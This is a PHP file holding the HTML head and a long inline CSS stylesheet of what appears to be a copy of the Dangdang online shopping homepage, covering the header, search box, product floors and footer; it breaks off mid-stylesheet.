<?php


?>



<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml">
    <head>
        
<base href="http://www.dangdang.com/Standard/Framework/Extend/hosts/" />

<title>当当—网上购物中心：图书、母婴、美妆、家居、数码、家电、服装、鞋包等，正品低价，货到付款</title><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="description" content="全球领先的综合性网上购物中心。超过100万种商品在线热销！图书、音像、母婴、美妆、家居、数码3C、服装、鞋包等几十大类，正品行货，低至2折，700多城市货到付款，（全场购物满59元免运费。当当网一贯秉承提升顾客体验的承诺，自助退换货便捷又放心）。" />
<meta name="keywords" content="当当网，当当，网上购物，网上商城，网上买书，购物中心，在线购物，图书，影视，音像，教育音像，CD， DVD，百货，母婴，家居，家纺，厨具，化妆品，美妆，个人护理用品，数码，电脑，笔记本，u盘，手机，mp3，mp4，数码相机，摄影，摄像，家电，软件，游戏，服装，鞋，礼品箱包，钟表首饰，玩具，运动健康用品" /><meta name="ddclick_guan" content="1" /><meta name="ddclick_page" content="id:1|name:当首" />
<link rel="canonical" href="http://www.dangdang.com/" />
<link rel="Stylesheet" type="text/css" href="http://www.dangdang.com/Standard/Framework/Extend/hosts/css/model/homemin.css" />
<style>/* 公用重置 */
.spacer{display:none;}
#bd{width:100%!important;margin:0 auto!important;}
#bd .bd_body{width:1200px;margin:0 auto;background-color:#fff;}
.product_tags{top:0;left:0;right:auto;height:20px!important;width:100px!important;overflow:hidden;}
/* 楼层公用 */
.home_screen{width:1200px;height:555px;margin:0 auto;overflow:hidden;position:relative;padding-bottom:20px;}
.home_screen .home_screen_head{height:44px;width:1200px;border-bottom:2px solid #000;position:absolute;top:0;left:0;font:bold 20px/44px "Microsoft YaHei";color:#323232;}
.home_screen .home_screen_head a,.home_screen .home_screen_head a:hover{color:#323232;text-decoration:none;}
.home_screen .home_screen_head a:hover{color:#ff2832;}
.home_screen .home_screen_head span{font-size:16px;position:relative;top:-3px;}
.home_screen .home_screen_left{height:499px;position:relative;}
.home_screen .home_screen_left .pic{width:238px;height:441px;border:1px solid #e6e6e6;position:absolute;top:56px;left:0;display:block;overflow:hidden;text-align:center;}
.home_screen .home_screen_left .pic a{display:block;width:238px;height:521px;overflow:hidden;text-align:center;}
.home_screen_left_l_con_over{position:absolute;bottom:1px;left:1px;width:237px;padding-left:1px;background-color:#fff;background:url(http://img63.ddimg.cn/upload_img/00111/home/home_bg_1509.png) 0 0;}
.home_screen .headfloor_tab{position:absolute;width:966px;top:0;right:0;}
.home_screen .headfloor_tab ul{float:right;border-right:1px solid #e6e6e6;}
.home_screen .headfloor_tab li{float:left;width:114px;height:42px;padding-top:1px;border:1px solid #e6e6e6;border-width:1px 0 0 1px;text-align:center;background-color:#f5f5f5;font:14px/42px "Microsoft YaHei";color:#646464;cursor:default;overflow:hidden;word-break:break-all;word-wrap:break-word;}
.home_screen .headfloor_tab li.first{margin-right:0;}
.home_screen .headfloor_tab li.on{font-weight:bold;background-color:#fff;width:112px;border:2px solid #000;border-bottom:0;padding:0 0 2px 0;margin-bottom:-2px;color:#525252;}
.home_screen .headfloor_tab li a,.home_screen .headfloor_tab li a:hover{color:#646464;text-decoration:none;}
.home_screen .headfloor_tab li.on a,.home_screen .headfloor_tab li.on a:hover{color:#323232;}
.home_screen_left_l_con_over li{float:left;width:63px;height:28px;line-height:28px;padding-left:16px;overflow:hidden;}
.home_screen_left_l_con_over li a,.home_screen_left_l_con_over li a:hover{color:#323232;font:12px/28px "Microsoft YaHei";}
.home_screen_left_l_con_over li a:hover{color:#ff2832;}
.home_screen .tab_box_aa .tab_content_aa{width:383px;height:340px;overflow:hidden;border:1px solid #e6e6e6;border-left:0;position:absolute;top:55px;left:240px;}
.home_screen .tab_box_aa .tab_content_aa a,.home_screen .tab_box_aa .tab_content_aa img{display:block;width:383px;height:340px;}
.home_screen .pic_uppper3{width:576px;height:260px;overflow:hidden;position:absolute;top:56px;left:624px;border:1px solid #e6e6e6;border-width:1px 0;}
.home_screen .pic_uppper3 li{width:191px;border-right:1px solid #e6e6e6;float:left;overflow:hidden;}
.home_screen .pic_uppper3 li a{display:block;width:191px;height:260px;overflow:hidden;text-align:center;}
.home_screen .pic_lower5{width:960px;position:absolute;left:240px;top:318px;border-bottom:1px solid #e6e6e6;height:180px;overflow:hidden;}
.home_screen .pic_lower5 li{float:left;width:191px;border-right:1px solid #e6e6e6;}
.home_screen .pic_lower5 li a{display:block;width:191px;height:180px;overflow:hidden;text-align:center;}
.home_screen .roll_aa{width:1198px;height:55px;position:absolute;top:497px;left:0;border:1px solid #e6e6e6;border-top:0;}
.home_screen .roll_aa .over{width:1190px;margin:0 auto;overflow:hidden;}
.home_screen .roll_aa .over ul{width:10000px;position:relative;}
.home_screen .roll_aa .over li{width:110px;height:50px;padding:3px 4px 2px 5px;float:left;overflow:hidden;}
.home_screen .roll_aa .over li a{display:block;width:110px;height:50px;overflow:hidden;text-align:center;}
.home_screen .roll_aa .btn_brand_prev,.home_screen .roll_aa .btn_brand_next{display:block;position:absolute;width:30px;height:43px;top:7px;background-image:url(http://img60.ddimg.cn/upload_img/00111/home/home_sprite_1507.png);background-repeat:no-repeat;background-color:#000;z-index:20;cursor:pointer;opacity:0.2;filter:alpha(opacity=20);}
.home_screen .roll_aa .btn_brand_prev{left:0;background-position:0px -83px;}
.home_screen .roll_aa .btn_brand_next{right:0;background-position:-36px -83px;}
.home_screen .roll_aa .btn_prev_hover,.home_screen .roll_aa .btn_next_hover{opacity:0.5;filter:alpha(opacity=50);}
.home_screen .tab_content_aafloor_tab .roll_aa{width:383px;height:260px;border:1px solid #e6e6e6;border-width:1px 1px 1px 0;left:240px;top:56px;overflow:hidden;}
.home_screen .tab_content_aafloor_tab .roll_aa .over{width:383px;}
.home_screen .tab_content_aafloor_tab .roll_aa .over ul{width:10000px;float:left;}
.home_screen .tab_content_aafloor_tab .roll_aa .over ul li{width:auto;height:auto;padding:0;}
.home_screen .tab_content_aafloor_tab .roll_aa .over ul li a{width:383px;height:260px;display:block;overflow:hidden;text-align:center;}
.home_screen .mix_marquee_tab{position:absolute;bottom:6px;left:50%;z-index:666;}
.home_screen .mix_marquee_tab li{float:left;width:10px;height:3px;margin-right:4px;_display:inline;font-size:0;line-height:9px;overflow:hidden;background:#fff;}
.home_screen .mix_marquee_tab li.current{background:#5e5e5e;}
.home_screen .tab_content_aafloor_tab .roll_aa .btn_brand_prev,.home_screen .tab_content_aafloor_tab .roll_aa .btn_brand_next{top:100px;}
.home_screen .icon_pop{display:block;width:100px;height:20px;overflow:hidden;top:137px;position:absolute;left:0;}
/* footer */
.footer{border-top: 2px solid #ff2832;margin-top: 15px;background-color: #fff;clear: both;}
.footer_pic_new{background-color: #fafafa;border-bottom:1px solid #ebebeb;width:100%;_width:expression(this.scrollWidth < 960 ? "960px" : "auto");min-width: 960px;}
.footer_pic_new .footer_pic_new_inner{width: 940px;margin: 0 auto;height: 68px;padding: 5px 0 5px 30px;}
.footer_pic_new .footer_pic_new_inner a{display: block;height: 52px;width: 187px;float: left;padding: 7px 0 7px 48px;}
.footer_pic_new .footer_pic_new_inner a span{text-indent: -9999px;display: block;width: 138px;height: 52px;background: url(http://img62.ddimg.cn/upload_img/00459/home/footer_bg.png) 0 0 no-repeat;font-size: 0;line-height: 0;cursor: pointer;}
.footer_pic_new .footer_pic_new_inner a.footer_pic01{border-left-width: 0;}
.footer_pic_new .footer_pic_new_inner a.footer_pic02 span{background-position: 0 -51px;}
.footer_pic_new .footer_pic_new_inner a.footer_pic03 span{background-position: 0 -103px;}
.footer_pic_new .footer_pic_new_inner a.footer_pic04 span{background-position: 0 -156px;}

.public_footer_new{width: 920px; height: 140px;margin: 0 auto;padding-top: 30px;}
.public_footer_new .footer_sort{width: 154px;float: left; text-align:center;}
.public_footer_new .footer_sort .f_title{display: block;padding-left: 30px;font-size: 14px;font-family: "microsoft yahei";color: #323232;height: 36px;line-height: 36px;}
.public_footer_new .footer_shangjia .f_title{background-position: 0px -200px;}
.public_footer_new .footer_distribution .f_title{background-position:0px -118px;}
.public_footer_new .footer_pay .f_title{background-position: 0px -39px;}
.public_footer_new .footer_characteristic .f_title{background-position: 0 -79px;}
.public_footer_new .footer_help .f_title{background-position: 0px -158px;}
.public_footer_new .footer_sort a{text-decoration: none;color: #7d7d7d;font-size: 12px;}
.public_footer_new .footer_sort a:hover{text-decoration: underline;color: #f44d20;}
.public_footer_new .footer_sort ul{padding-left: 30px; list-style:none; margin:0;}
.public_footer_new .footer_sort ul li{line-height: 20px;height: 20px;}
.public_footer_new .footer_shangjia{width: 150px;}

.footer_nav_box{border-top: 1px solid #ebebeb;width:100%;_width:expression(this.scrollWidth < 960 ? "960px" : "auto");min-width: 960px;padding: 17px 0 50px;}
.footer_nav_box a,.footer_nav_box{color: #8c8c8c;font-size: 12px;text-decoration: none;}
.footer_nav_box a:hover{color: #f48570;text-decoration: underline;}
.footer_nav_box .footer_nav{text-align: center;line-height: 20px;padding-bottom: 17px;}
.footer_nav_box .footer_nav span.sep{margin: 0 17px 0 19px;}
.footer_nav_box .footer_copyright{line-height: 20px;text-align: center;width: 960px;margin: 0 auto;}
.footer_nav_box .footer_copyright span.sep{margin:0 17px 0 19px;}
.footer_nav_box .footer_icon{padding: 10px 0 0 340px;width: 640px;margin: 0 auto;height: 77px;}
.footer_nav_box .validator,.footer_nav_box .knet{float:left;display:inline;padding:15px 5px 15px;width:135px;height:47px;}

.footer_copyright {padding: 10px 0 0 0; margin: 0 auto;float: none; width: auto;text-align: center;color: #8c8c8c;}
.footer_copyright span, .public_footer .footer_copyright a.footer_img { display: inline-block; float: none; }
.footer_copyright a { padding: 0 4px; color: #8c8c8c;font-size: 12px;text-decoration: none;}
.footer_copyright a:hover{color: #f48570;text-decoration: underline;}
.footer_nav_box .footer_nav .footer_hot_search{display:inline-block;*display:inline;width:50px;position:relative}
.footer_nav_box .footer_nav .pos_a_box{position:absolute;left:-251px;top:22px;background-color:#f48570;width:300px;border-radius:8px;text-align:center;height:14px;line-height:14px}
.footer_nav_box .footer_nav .pos_a_box a,.footer_nav_box .footer_nav .pos_a_box a:hover,.footer_nav_box .footer_nav .pos_a_box span{padding:0 2px;color:#fff;text-decoration:none}
.footer_nav_box .footer_nav .pos_a_box i{display:block;width:0;height:0;line-height:0;font-size:0;border-width:0 4px 4px;border-style:solid;border-color:#fff #fff #f48570 #fff;position:absolute;right:20px;top:-4px}

/* hd */
#hd{font:12px 'Hiragino Sans GB',"simsun","Arial";color:#646464;min-width: 1200px;background-color: #fff;}
#hd a{color:#646464;text-decoration:none;}
#hd a:hover{color:#ff2832;text-decoration:underline;}
#hd .tools{width:100%;background-color:#f9f9f9;border-bottom:1px solid #f2f2f2;height:34px;line-height:34px;position: relative;z-index: 10010;}
#hd .tools a,#hd .tools a:hover{text-decoration:none;}
#hd .tools a.hover{color:#ff2832;}
.tools .ddnewhead_operate{width:1200px;margin:0 auto;background-color:#f9f9f9;height:34px;}
.tools .ddnewhead_welcome{padding:5px 0 0 10px;height:24px;line-height:24px;position:relative;float:right;z-index:50;}
.ddnewhead_welcome i.icon_tel{float:left;width:11px;height:16px;margin:4px 5px 0 0;_display:inline;background:url(http://img63.ddimg.cn/upload_img/00459/home/head_sprite.png) no-repeat -40px -70px;}
.tools .ddnewhead_welcome a{display:inline-block;margin-right:4px;}
.tools .ddnewhead_welcome a.login_link{color:#ff2832!important;}
.tools .ddnewhead_welcome .hi{display:inline-block;height:24px;color:#ff2832;}
.tools .ddnewhead_welcome .hi_none{color:#646464;font-weight:normal;padding:0 0 0 10px;}
.tools .ddnewhead_welcome .tel_pop{position:absolute;height:201px;left:0;top:2px;}
.ddnewhead_welcome .tel_pop .title{width:70px;height:28px;line-height:28px;padding:0 0 8px 9px;border:1px solid #e6e6e6;border-bottom:none;background-color:#fff;box-shadow:1px 1px 2px #dfdfdf;font-size: 12px;font-weight: normal;position: static;z-index: auto;}
.ddnewhead_welcome .tel_pop .tel_pop_box{border:1px solid #e6e6e6;background-color:#fff;box-shadow:1px 1px 2px #dfdfdf;width: 104px;}
.ddnewhead_welcome .tel_pop .title_shadow{display:block;position:absolute;top:36px;left:1px;height:5px;width:79px;background-color:#fff;font-size: 0;line-height: 0;}
.ddnewhead_welcome .tel_pop .icon_tel{float:left;width:11px;height:16px;margin:6px 5px 0 0;_display:inline;background:url(http://img63.ddimg.cn/upload_img/00459/home/head_sprite.png) no-repeat -51px -70px;}
.tools .ddnewhead_welcome .tel_pop_box a{margin:0;}
#hd .tel_pop a.title,#hd .tel_pop a.title:hover{color:#ff2832;}
.ddnewhead_welcome .tel_pop_box li{height:158px;margin-top:3px;width:104px;text-align:center;line-height:18px;overflow:hidden;}
.ddnewhead_welcome .tel_pop_box li.left{border-right:1px dashed #e6e6e6;width:108px;}
.ddnewhead_welcome .tel_pop_box li img{display:block;margin: 0 auto;}
#hd .tel_pop_box a,#hd .tel_pop_box a:hover{color:#646464;}
.tel_pop_box li span{display:block;padding:3px 0 6px;}
#hd .tel_pop_box a .text,#hd .tel_pop_box a:hover .text{color:#969696;padding-top:8px;}
.tools .ddnewhead_operate_nav{float:right;padding-top:2px;}
.ddnewhead_operate_nav li{float:left;height:22px;padding-top:4px;line-height:21px;background:url(http://img63.ddimg.cn/upload_img/00459/home/head_sprite.png) no-repeat left -285px;position:relative;z-index:100;}
.ddnewhead_operate_nav li a{display:block;position:relative;line-height:21px;padding:0 7px 0 8px;}
.ddnewhead_operate_nav li a.menu_btn{background:url(http://img63.ddimg.cn/upload_img/00459/home/head_sprite.png) no-repeat right -307px;padding-right:23px;}
.ddnewhead_operate_nav li a.hover{background-color:#fff;background-position:right -321px;padding-top:3px;margin:-4px -1px 0;border:1px solid #e6e6e6;border-bottom:none;position:relative;width:48px;}
.ddnewhead_operate_nav li.ddnewhead_cart{background-image:none;}
.ddnewhead_operate_nav li.ddnewhead_cart b{color:#ff2832;font:bold 12px "Arial"}
.ddnewhead_operate_nav li .icon_card{float:left;width:15px;height:14px;background:url(http://img63.ddimg.cn/upload_img/00459/home/home_sprite2.png) no-repeat -40px -86px;overflow:hidden;margin:3px 9px 0 0;}
.ddnewhead_gcard_list{position:absolute;top:21px;left:-1px;border:1px solid #e6e6e6;border-top:none;background-color:#fff;padding:4px 0;display:none;}
.ddnewhead_gcard_list li{background:none;float:none;height:22px;line-height:22px;padding:0;width:79px;}
.ddnewhead_gcard_list li a{padding:0 0 0 8px;line-height:22px;height:22px;display:block;}
.ddnewhead_gcard_list li a:hover{background:#f2f2f2;display:block;padding:0 1px 0 9px;margin:0 -1px;position:relative;color:#646464!important;line-height:22px;}
#hd .new_york{float: right;padding-left: 11px;background: url(http://img63.ddimg.cn/upload_img/00459/home/head_sprite.png) no-repeat left -285px;padding-top: 3px;}
#hd .new_york a{color:#ff2832;padding-left: 27px;background: url(http://img33.ddimg.cn/upload_img/00363/header/nyse_icon.png) no-repeat 0 1px;display: block;height: 26px;line-height: 26px;width: 85px;}
.ddnewhead_operate_nav li.my_dd a.menu_btn{padding-right: 27px;}
.ddnewhead_operate_nav li.my_dd .ddnewhead_gcard_list li{width: 82px;}

.tools .ddnewhead_operate_nav i.icon_tel{width:11px;height:16px;background:url(http://img63.ddimg.cn/upload_img/00459/home/head_sprite.png) no-repeat -40px -70px;position: absolute;left: 11px;top:2px;}
.tools .ddnewhead_operate_nav .tel_pop .icon_tel{background-position: -51px -70px;position: absolute;left: 10px;top:5px;}
.ddnewhead_operate_nav li.dang_erweima{width: 84px;}
.ddnewhead_operate_nav li.dang_erweima a.menu_btn{background: none;padding: 0 9px 0 27px;width: auto;border: 0;margin:0;height: 21px;}
.ddnewhead_operate_nav li.dang_erweima .tel_pop{position:absolute;height:201px;left:0;top:0px;}
.ddnewhead_operate_nav li.dang_erweima .tel_pop .title{width:57px;height:26px;line-height:26px;padding:0 0 1px 26px;border:1px solid #efefef;border-bottom:none;background-color:#fff;box-shadow:1px 1px 2px rgba(51,51,51,0.3);*padding-top:1px;}
.ddnewhead_operate_nav li.dang_erweima .tel_pop .tel_pop_box{border:1px solid #efefef;box-shadow:1px 1px 2px rgba(51,51,51,0.3);width: 203px;background:#fff url(http://img33.ddimg.cn/upload_img/00363/sjbz/line_erweima.png) center 29px no-repeat;padding-left: 8px;}
.ddnewhead_operate_nav li.dang_erweima .tel_pop .tel_pop_box .tel_pop_box_li{width: 98px;float: left;}
.ddnewhead_operate_nav li.dang_erweima .tel_pop .tel_pop_box .tel_pop_box_li a{padding: 8px 0;text-align: center;line-height: 18px;}
.ddnewhead_operate_nav li.dang_erweima .tel_pop .tel_pop_box .tel_pop_box_li a span{display: block;line-height: 18px;}
.ddnewhead_operate_nav li.dang_erweima .tel_pop .tel_pop_box .tel_pop_box_li a img{display: block;width: 75px;height: 75px;margin: 6px auto 0;}
.ddnewhead_operate_nav li.dang_erweima .tel_pop .title_shadow{display:block;position:absolute;top:27px;left:1px;height:5px;width:84px;background-color:#fff;font-size: 0;line-height: 0;}

.ddnewhead_collect { float:left; background:url(http://img63.ddimg.cn/upload_img/00459/home/head_sprite.png) 0 -121px no-repeat; padding-left:20px;}
/* logo_line */
#hd .logo_line_out{position: relative;z-index:10002;}
#hd .logo_line{height:100px;width:1200px;margin:0 auto;position:relative; }
#hd .logo_line .logo{overflow:hidden;width:362px;vertical-align:middle;position: absolute;left: 0;top: 0;}
#hd .logo_line .logo a{float:left;margin-right:15px;_display:inline;}
#hd .logo_line .search{position:absolute;margin-top:20px;height:48px;z-index: 9999;left: 362px;top: 0;}
#hd .logo_line .search form{display:block;height:50px;}
#hd .logo_line .search .label_search{position:absolute;top:2px;left:10px;width:398px;height:36px;line-height:36px;z-index:1;overflow: hidden;}
#hd .logo_line .search .text{width:398px;height:18px;border:2px solid #ff2832; border-right:none; padding:9px 0 9px 10px;position:absolute;left:0;top:0;z-index:2;color:#323232;font:12px/18px 'Hiragino Sans GB',"simsun",Arial;outline:0;background:none;}
#hd .logo_line .search .select{position:absolute;top:0px;left:410px;border:2px solid #ff2832;border-left:0px solid #dedede;width:92px;height:36px;font:16px/36px "Microsoft Yahei";color:#969696;padding:0 0 0 14px;cursor:pointer;background-color:#f6f6f6;}
#hd .logo_line .search .select .icon{width:13px;height:7px;overflow:hidden;background:url(http://img63.ddimg.cn/upload_img/00459/home/head_sprite.png) no-repeat -14px -90px;position: absolute;left: 88px;top: 16px;}
#hd .logo_line .search .button{width:48px;height:40px;border:none;background:url(http://img63.ddimg.cn/upload_img/00459/home/head_sprite.png) no-repeat 0 -346px;cursor:pointer;position:absolute;left:517px;top:0;}
#hd .logo_line .search .button:hover{background:url(http://img63.ddimg.cn/upload_img/00459/home/head_sprite.png) no-repeat 0 -390px;}
#hd .logo_line .search_bottom{position:absolute;top:65px;left:362px;color:#969696;width:585px;line-height:20px;z-index:6666;}
.logo_line .search_hot{float:left;width:518px;overflow:hidden;height:20px;}
#hd .logo_line .search_bottom a,#hd .logo_line .search_bottom a:hover{color:#969696;margin-right:15px;_display:inline;height:20px;overflow:hidden;}
#hd .logo_line .search_bottom a:hover{color:#ff2832;}
.logo_line .search_advs{float:left;}

/* select_pop */
.logo_line .search .select_pop{width:104px;height:288px;border:1px solid #dedede;position:absolute;top:36px;left:0px;background-color:#fff;overflow:auto;}
.logo_line .search .select_pop a,.logo_line .search .select_pop a:hover{display:block;height:24px;padding:0 5px 0 15px;text-decoration:none;font:12px/24px 'Hiragino Sans GB',"simsun";}
.logo_line .search .select_pop a:hover{background-color:#c8c8c8;color:#fff!important;}

/* suggest_key */
.logo_line .suggest_key{width:408px;border:1px solid #c8c8c8;border-top:none;z-index:7777;position:absolute;left:362px;top:60px;background-color:#fff;color:#323232;}
.logo_line .suggest_key ul{padding-top:6px;}
.logo_line .suggest_key li{display:block;padding-left:10px;height:22px;line-height:22px;*vertical-align: top;cursor: pointer;}
.logo_line .suggest_key li strong{color:#969696;font-weight:normal;}
.logo_line .suggest_key .select_key_sort li{padding-left:22px;color:#969696;}
.logo_line .suggest_key .select_key_sort li strong{color:#323232;font-weight:bold;}
.logo_line .suggest_key li.select_key,.logo_line .suggest_key li.select_key strong{color:#ff2832;}
.logo_line .suggest_key .select_key_sort{border-bottom:1px dashed #dcdcdc;padding-bottom:6px;}
.logo_line .suggest_key .d{float:right;color:#969696;padding-right:10px;}
.logo_line .suggest_key .arrow,.logo_line .suggest_key .arrow2{display:inline-block;padding-right:10px;background:url(http://img63.ddimg.cn/upload_img/00459/home/head_sprite.png) no-repeat right -431px;max-width: 122px;*width:122px;}
.logo_line .suggest_key li .arrow div,.logo_line .suggest_key li .arrow2 div {max-width: 122px;*width:122px;height: 20px;overflow: hidden;position: relative;}
.logo_line .suggest_key .select_key{background-color:#f5f5f5;}
.logo_line .suggest_key .select_pop{position:absolute;left:146px;top:0;width:222px;padding:5px 20px 0;height:306px;background-color:#f5f5f5;}
.narrow_page .logo_line .suggest_key{width: 353px;}
.narrow_page .logo_line .suggest_key .select_pop{padding: 5px 2px 0 5px; width:200px;}
#hd .suggest_key .select_pop .name a{color:#323232;font-weight:bold;}
#hd .suggest_key .select_pop .name a:hover{color:#ff2832;text-decoration:none;}{}
.suggest_key .select_pop .pic{float:left;border:1px solid #e6e6e6;height:88px;width:88px;overflow:hidden;}
.suggest_key .select_pop .pic img{height:88px;width:88px;display: block;}
.suggest_key .select_pop .content{float:left;padding-left:10px;width: 122px;}
.narrow_page .logo_line .suggest_key .select_pop .content { padding-left:6px; width:104px;}
.suggest_key .select_pop .content p{line-height:20px;padding-top:10px;color:#323232;}
.suggest_key .select_pop .content p.h-limit{padding:0;}
.suggest_key .select_pop .content p.button{padding-top:6px;}
.suggest_key .select_pop .content p .price{font:bold 12px Arial;color:#ff2832;}
.suggest_key .select_pop .content p.button a,.suggest_key .select_pop .content p.button a:hover{display:inline-block;width:78px;height:20px;background-color:#f5f5f5;color:#ff2832!important;border:1px solid #ff2832;text-align:center;line-height:20px;text-decoration:none!important;}
.suggest_key .select_pop .content p.button a:hover{background-color:#ff2832;color:#fff!important;}
.suggest_key .select_pop .content .star{display:block;height:16px;width:105px;background:url(http://img4.ddimg.cn/header/header2014/icon_star.png) repeat-x 2px -20px;margin:0 0 0 -2px;float: none;}
.suggest_key .select_pop .content .star .level{background:url(http://img4.ddimg.cn/header/header2014/icon_star.png) repeat-x 2px 0;height:16px;display:block;}
.suggest_key .select_pop .name{padding-bottom:5px;}
.logo_line .suggest_key .search_history li,.logo_line .suggest_key .search_history li.select_key,.logo_line .suggest_key .search_history li.select_key .d{color: #1a66af;}
.logo_line .suggest_key .search_history li .d{color: #969696;}
.logo_line .suggest_key .search_history .search_history_key{display: block;width: 132px;position: relative;}
.logo_line .suggest_key .search_history li .del{float: right;padding-right: 10px;}
.logo_line .suggest_key .search_history li .arrow .del, .logo_line .suggest_key .search_history li .arrow2 .del{padding-right: 0;}
.logo_line .suggest_key .search_history li .arrow,.logo_line .suggest_key .search_history li .arrow2{background: none;padding-right: 0;max-width:132px;width:132px;}
.logo_line .suggest_key .search_history li .arrow div,.logo_line .suggest_key .search_history li .arrow2 div{padding-right: 10px;background: url(http://img63.ddimg.cn/upload_img/00459/home/head_sprite.png) no-repeat right -431px;max-width: 86px;*width: 86px;display: inline-block;}
.logo_line .suggest_key .search_history li .isdiv{height: 22px;overflow: hidden;max-width: 326px;}
.narrow_page .logo_line .suggest_key .search_history li .isdiv{max-width: 314px;}

.logo_line .ddnew_cart,.logo_line .ddnew_order { height:36px;position:absolute; top:20px; border:2px solid #dcdcdc; font:14px/36px "Microsoft Yahei";}
.logo_line .ddnew_cart { right:88px; width:107px; border-color:#ff2832; background:url(http://img62.ddimg.cn/upload_img/00459/home/icon_cart.png) 5px 0 no-repeat #ff2832;}
.logo_line .ddnew_cart:hover { background-position:5px -36px; background-color:#f6f6f6; border-color:#dcdcdc; color:#ff2832;}
#hd .logo_line .ddnew_cart a:hover, #hd .logo_line .ddnew_order a:hover { text-decoration:none;}
.logo_line .ddnew_cart a b, .logo_line .ddnew_order a b, .logo_line .ddnew_cart a:hover b { color:#ff2832; padding-left:3px; font-family:Arial; font-weight:bold;}
#hd .logo_line .ddnew_cart a, .logo_line .ddnew_cart a b { color:#fff;}
#hd .logo_line .ddnew_cart:hover a, .logo_line .ddnew_cart:hover a b { color:#ff2832;}
.logo_line .ddnew_order { width:86px; padding:0; text-align:center; right:0; border-left:0; background-color:#f6f6f6;}
.logo_line .ddnew_order a { display:inline-block; width:86px;}
.logo_line .ddnew_cart a { padding-left:35px; width:72px; display:inline-block;}

/* nav_top */
#hd .nav_top{width:100%;height:40px; border-bottom:3px solid #ff2832;}
#hd .nav_top a,#hd .nav_top a:hover{color:#323232;font:14px/40px "Microsoft Yahei";text-decoration:none;padding:0 15px;display:block;font-weight: bold;}
#hd .nav_top ul{width:1200px;margin:0 auto;}
#hd .nav_top ul li{float:left;text-align:center;position: relative;}
#hd .nav_top ul li.all{width:200px;margin-right:17px; _display:inline;text-align:left;background:#ff2832;position:relative;}
#hd .nav_top ul li.all a,#hd .nav_top ul li.all a:hover{padding:0 0 0 20px;display: block;width: 171px;background: url(http://img63.ddimg.cn/upload_img/00459/home/head_sprite.png) no-repeat 161px -567px; color:#fff;}
#hd .nav_top ul li a:hover{display:block; color:#ff2832;}
.narrow_page #hd .nav_top ul{width:960px;}
#hd .nav_top ul li.all a:hover{background: url(http://img63.ddimg.cn/upload_img/00459/home/head_sprite.png) no-repeat 161px -567px;}
#hd .icon_n {position: absolute;display: block;bottom: 26px;left: 50%;margin-left: -28px;text-align: center; font-size: 0;}

#hd .sub {background: #f5f5f5; float: none; width: auto; }
#hd .sub ul { height: 31px; margin: 0 auto; overflow: hidden; line-height: 30px; width: 1200px;}
#hd .sub ul li {float: left; padding: 0 15px; margin-left: -1px; white-space: nowrap; background:url(http://img4.ddimg.cn/header/header2014/sub_line_bg.png) right center no-repeat;_line-height: 12px;
_padding: 9px 15px 8px;}
#hd .sub ul li img { vertical-align: middle; _vertical-align: top;}
#hd .sub ul li.sub_big_li{width: 100px;position: relative;overflow: hidden;background: none;text-align: center;font-size: 16px;font-family: "Microsoft Yahei";color: #403108;padding-left: 20px;}
#hd .sub ul li.sub_big_li a,#hd .sub ul li.sub_big_li a:hover{font-size: 16px;font-family: "Microsoft Yahei";color: #403108;}
#hd .th_sub{background-color: #ff2832;}
#hd .th_sub ul li a,#hd .th_sub ul li a:hover{color:#fff;}
#hd .th_sub ul li.sub_big_li a,#hd .th_sub ul li.sub_big_li a:hover{color: #fff;}
/* narrow_header */
.narrow_page #hd{min-width: 960px;}
.narrow_page .tools .ddnewhead_operate{width:960px;}
.narrow_page #hd .logo_line{width:960px;}
.narrow_page #hd .logo_line .search .text,.narrow_page #hd .logo_line .search .label_search{width:188px;}
.narrow_page #hd .logo_line .search .select{left:200px;}
.narrow_page #hd .logo_line .search .button{left:307px;}
.narrow_page .logo_line .search_hot{width:308px;}
.narrow_page #hd .nav_top a, .narrow_page #hd .nav_top a:hover {padding: 0 9px;}
.narrow_page #hd .sub ul{width: 960px;}
.narrow_page #hd .home_nav_l_box{width: 960px;}

/* 站内信 */
#hd .new_head_znx{float:right;position: relative;padding-top: 2px; margin-right:-1px;z-index: 100;font-family: arial,simsun;}
#hd .new_head_znx a.head_znx_a {display: block;_display:inline-block;position: relative;line-height: 22px;height: 22px;background: url(http://img63.ddimg.cn/upload_img/00459/home/head_sprite.png) no-repeat right -303px;padding: 4px 19px 0 7px;}
#hd .new_head_znx a.head_znx_a span{color: #ff2832;}
#hd .new_head_znx a.hover{color: #ff2832;background-color: #fff;background-position: right -320px;padding-top: 3px;border: 1px solid #e6e6e6;border-bottom:0;position: relative;z-index: 100;padding-right:18px; padding-left:6px;}
#hd .new_head_znx .head_znx_list{position: absolute;top: 27px;left: 0px;border: 1px solid #e6e6e6;background-color: #fff;padding: 4px 0;width: 100px;}
#hd .new_head_znx .head_znx_list li {background: none;float: none;height: 22px;line-height: 22px;padding: 0;position: relative;z-index: 100;}
#hd .new_head_znx .head_znx_list li a {padding: 0 0 0 8px;line-height: 22px;height: 22px;display: block;}
#hd .new_head_znx .head_znx_list li a span,#hd .new_head_znx .head_znx_list li a:hover span{color: #ff2832;}
#hd .new_head_znx .head_znx_list li a:hover{background:#f2f2f2;display:block;padding:0 1px 0 9px;margin:0 -1px;position:relative;color:#646464!important;line-height:22px;}
/* 区域 */
#hd .ddnewhead_area{float:left;position: relative;padding-top: 2px; margin-right:-1px;_margin-right:-10px;z-index: 100;font-family: arial,simsun;}
#hd .ddnewhead_area a.ddnewhead_area_a {display: block;_display:inline-block;position: relative;line-height: 22px;height: 22px;background: url(http://img63.ddimg.cn/upload_img/00459/home/head_sprite.png) no-repeat right -303px;padding: 4px 22px 0 9px;}
#hd .ddnewhead_area a.hover{background-color: #fff;background-position: right -320px;padding-top: 3px;border: 1px solid #e6e6e6;border-bottom:0;position: relative;z-index: 100;padding-right:21px; padding-left:8px; color:#646464;}
#hd .ddnewhead_area .ddnewhead_area_list{position: absolute;top:27px;left: 0px;border: 1px solid #e6e6e6;background-color: #fff;padding:10px 0 10px 10px;width:298px;}
#hd .ddnewhead_area .ddnewhead_area_list li {background: none;float:left; width:48px; height: 26px;line-height: 26px;padding: 0 0 0 10px;position: relative;z-index: 100;}
#hd .ddnewhead_area .ddnewhead_area_list li a {line-height: 26px;height: 26px;}

/* mydang */
.main_frame{zoom: 1;}
.main_frame:after{content: '.'; height: 0; display: block; clear: both; visibility: hidden;}

